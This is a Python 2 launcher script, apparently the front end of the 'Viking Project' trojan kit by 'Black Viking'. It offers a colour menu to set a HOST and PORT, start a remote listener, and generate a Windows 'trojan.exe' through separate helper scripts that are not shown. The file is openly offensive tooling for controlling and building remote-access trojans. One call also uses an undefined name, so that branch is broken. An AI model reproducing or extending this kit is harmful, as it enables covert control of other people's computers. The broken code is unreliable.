#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

__author__ = "Black Viking"
__date__   = "16.04.2017"

import os
import sys
import subprocess
from colorama import init
from colorama import Fore, Back, Style

reload(sys)
sys.setdefaultencoding("utf-8")

green = Fore.GREEN
yellow = Fore.YELLOW
red = Fore.RED
blue = Fore.CYAN
white = Fore.WHITE
bright = Style.BRIGHT

host = " "
port = " "

def logo():
    logo = blue + """ %s
\t/$$    /$$ /$$   /$$ /$$   /$$  /$$$$$$ 
\t| $$   | $$| $$  /$$/| $$$ | $$ /$$__  $$
\t| $$   | $$| $$ /$$/ | $$$$| $$| $$  \__/
\t|  $$ / $$/| $$$$$/  | $$ $$ $$| $$ /$$$$
\t \  $$ $$/ | $$  $$  | $$  $$$$| $$|_  $$
\t  \  $$$/  | $$\  $$ | $$\  $$$| $$  \ $$
\t   \  $/   | $$ \  $$| $$ \  $$|  $$$$$$/
\t    \_/    |__/  \__/|__/  \__/ \______/ 
                                         
                                                                                          
\t%s%s
\t[>]--->       Viking Project      <---[<]%s
\t[>]--->        Version: 1.0       <---[<]
\t[>]--->   github.com/blackvkng    <---[<]
\t[>]--->        %sBlack Viking%s       <---[<]
"""%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
    print logo
    help()
    print bright + white + "="*80

def help():
    print bright + yellow + """
Commands:
    set HOST           : Set HOST value.
    set PORT           : Set PORT value.
    show options       : Show HOST and PORT values.
    start listener     : Start Listener.

    generate exec --name trojan.exe : Generating exe files.(Only on Windows with PyInstaller)

Example:
    vkng => set HOST 127.0.0.1
    vkng => set PORT 8000
    vkng => show options
[~] HOST: 127.0.0.1
[~] PORT: 8000
===========================================================
    vkng => start listener / start / run"""
    

#-----------------   Main Function   -----------------#

def main():
    global host, port

    while True:
        vkng = raw_input(bright+red+"vkng %s=%s> "%(Style.NORMAL, bright)).lower()

        if vkng == "help":
            help()

        elif "set host" in vkng:
            host = vkng.split()[-1]

        elif "set port" in vkng:
            port = int(vkng.split()[-1])

        elif vkng == "show options":
            print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60

        elif vkng == "start" or vkng == "run" or vkng == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'source/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " source/listener.py %s %s"%(host, str(port)))
            else:
                print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60

        elif "generate exec --name" in vkng:
            if os.name == "nt":
                if host != " " and port != " ":
                    name = vkng.split()[-1]
                    if name != "":
                        subprocess.Popen([sys.executable, 'source/generate_exec.py', host, str(port), name], creationflags=CREATE_NEW_CONSOLE)
                    else:
                        pass
                else:
                    print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60

            else:
                print bright + yellow + "[*] This function only work on Windows!"



if __name__ == "__main__":
    init(autoreset=True)
    logo()
    main()
